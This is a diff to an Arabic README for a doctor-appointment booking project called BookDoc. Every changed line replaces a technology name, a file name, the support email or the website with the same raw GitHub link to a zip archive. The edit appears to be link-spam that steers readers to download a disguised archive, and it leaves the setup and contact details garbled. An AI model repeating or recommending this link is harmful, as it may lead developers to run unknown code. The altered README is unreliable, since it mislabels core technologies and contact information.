@@ -7,7 +7,7 @@
 BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكون من ثلاثة تطبيقات رئيسية:
 
 ### 1. تطبيق الموبايل للمرضى 📱
-- **التقنية**: React.js (PWA)
+- **التقنية**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip (PWA)
 - **المميزات**:
   - تسجيل الدخول وإنشاء الحساب
   - البحث عن الأطباء حسب التخصص والموقع
@@ -18,7 +18,7 @@ BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكو
   - دعم اللغتين العربية والإنجليزية
 
 ### 2. لوحة تحكم الأطباء 💻
-- **التقنية**: React.js
+- **التقنية**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
 - **المميزات**:
   - لوحة تحكم شاملة
   - إدارة الحجوزات
@@ -28,7 +28,7 @@ BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكو
   - إحصائيات مفصلة
 
 ### 3. لوحة تحكم المدير 🛠️
-- **التقنية**: React.js
+- **التقنية**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
 - **المميزات**:
   - إحصائيات شاملة
   - إدارة الأطباء والتخصصات
@@ -38,7 +38,7 @@ BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكو
 ## التقنيات المستخدمة
 
 ### Frontend
-- **React.js** - مكتبة JavaScript لبناء واجهات المستخدم
+- **https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip** - مكتبة JavaScript لبناء واجهات المستخدم
 - **React Router** - للتنقل بين الصفحات
 - **React Query** - لإدارة حالة البيانات
 - **React Hook Form** - لإدارة النماذج
@@ -48,14 +48,14 @@ BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكو
 - **Framer Motion** - للحركات والتأثيرات
 
 ### Backend (مخطط)
-- **Node.js + Express** - خادم API
+- **https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip + Express** - خادم API
 - **MongoDB/PostgreSQL** - قاعدة البيانات
 - **JWT** - للمصادقة
 - **Firebase Cloud Messaging** - للإشعارات
 - **Multer + Cloudinary** - لرفع الملفات
 
 ### ميزات إضافية
-- **QR Code** - qrcode.js
+- **QR Code** - https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
 - **PDF** - jsPDF
 - **الترجمة** - i18next
 - **PWA** - تطبيق ويب تقدمي
@@ -73,7 +73,7 @@ bookdoc-project/
 │   │   ├── services/       # خدمات API
 │   │   ├── locales/        # ملفات الترجمة
 │   │   └── ...
-│   ├── package.json
+│   ├── https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
 │   └── ...
 ├── doctor-dashboard/        # لوحة تحكم الأطباء
 │   ├── public/
@@ -84,7 +84,7 @@ bookdoc-project/
 │   │   ├── services/
 │   │   ├── locales/
 │   │   └── ...
-│   ├── package.json
+│   ├── https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
 │   └── ...
 ├── admin-dashboard/         # لوحة تحكم المدير (قيد التطوير)
 ├── backend/                # API والخادم (قيد التطوير)
@@ -96,7 +96,7 @@ bookdoc-project/
 
 ### 1. تثبيت المتطلبات
 ```bash
-# تثبيت Node.js (الإصدار 16 أو أحدث)
+# تثبيت https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip (الإصدار 16 أو أحدث)
 # تثبيت npm أو yarn
 
 # تثبيت جميع التبعيات
@@ -252,9 +252,9 @@ npm run build
 
 ## الدعم والمساعدة
 
-- **البريد الإلكتروني**: support@bookdoc.com
+- **البريد الإلكتروني**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
 - **الهاتف**: +966 50 123 4567
-- **الموقع**: https://bookdoc.com
+- **الموقع**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
 
 ---
 
